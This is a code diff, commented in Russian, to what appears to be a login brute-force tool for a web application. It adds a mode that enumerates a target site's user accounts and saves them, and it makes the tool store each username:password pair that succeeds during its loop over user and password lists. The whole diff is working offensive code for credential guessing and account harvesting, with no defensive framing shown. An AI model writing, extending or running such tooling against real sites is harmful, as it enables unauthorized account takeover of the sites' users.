@@ -161,7 +161,7 @@ def load_passwords(args) -> list:
     Загружает пароли из аргументов командной строки или файла.
     """
     passwords = []
-    if args.password:
+    if args.password is not None:
         passwords.append(args.password)
     if args.passwords:
         if os.path.exists(args.passwords):
@@ -195,22 +195,46 @@ def main():
         logging.error(f"Не удалось определить версию! URL: {args.url}")
         sys.exit(1)
     logging.info(f"Версия: {version}")
-    
+
+    # Режим только получения списка пользователей
+    if args.get and not args.user and not args.users and args.password is None and not args.passwords:
+        users = fetch_users(args.url)
+        if not users:
+            logging.critical("Не удалось получить список пользователей!")
+            sys.exit(1)
+        logging.info(f"Найдено пользователей: {len(users)}")
+        for user in users:
+            print(user)
+        if args.output:
+            with open(args.output, "w", encoding="utf-8") as f:
+                f.write("\n".join(users))
+            logging.info(f"Список пользователей сохранён в {args.output}")
+        sys.exit(0)
+
     users = load_users(args, args.url)
     if not users:
         logging.critical("Пользователи не загружены!")
         sys.exit(1)
-    
+
     passwords = load_passwords(args)
     if not passwords:
         logging.critical("Пароли не загружены!")
         sys.exit(1)
-    
+
     # Перебор комбинаций пользователей и паролей
+    results = []
     for password in passwords:
         for username in users:
             if check_credentials(username, password, args.url, version):
+                result = f"{username}:{password}"
+                results.append(result)
                 logging.info(f"[+] Успешная аутентификация! Пользователь: {username}, Пароль: {password}")
+
+    # Сохранение результатов в файл
+    if args.output and results:
+        with open(args.output, "w", encoding="utf-8") as f:
+            f.write("\n".join(results))
+        logging.info(f"Результаты сохранены в {args.output}")
 
 if __name__ == "__main__":
     main()
